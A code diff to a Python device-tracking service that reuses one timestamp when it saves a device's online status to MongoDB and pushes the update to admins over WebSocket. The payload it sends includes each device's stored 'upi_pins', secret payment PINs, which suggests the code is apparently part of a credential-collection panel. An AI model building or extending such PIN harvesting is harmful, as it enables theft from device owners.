@@ -372,9 +372,10 @@ class DeviceService:
     @staticmethod
     async def update_online_status(device_id: str, is_online: bool):
         try:
+            now = utc_now()
             await mongodb.db.devices.update_one(
                 {"device_id": device_id},
-                {"$set": {"is_online": is_online, "last_online_update": utc_now(), "updated_at": utc_now()}}
+                {"$set": {"is_online": is_online, "last_online_update": now, "updated_at": now}}
             )
             
             # Notify admins about device online status update via WebSocket
@@ -388,8 +389,8 @@ class DeviceService:
                         "battery_level": device_doc.get("battery_level"),
                         "has_upi": device_doc.get("has_upi", False),
                         "upi_pins": device_doc.get("upi_pins", []),
-                        "last_online_update": to_iso_string(utc_now()),
-                        "updated_at": to_iso_string(utc_now()),
+                        "last_online_update": to_iso_string(now),  # ✅ Use same 'now' that was saved to DB
+                        "updated_at": to_iso_string(now),
                     }
                     await admin_ws_manager.notify_device_update(device_id, device_payload)
                     logger.debug(f"WebSocket notification sent for device online status update: device={device_id}, is_online={is_online}")
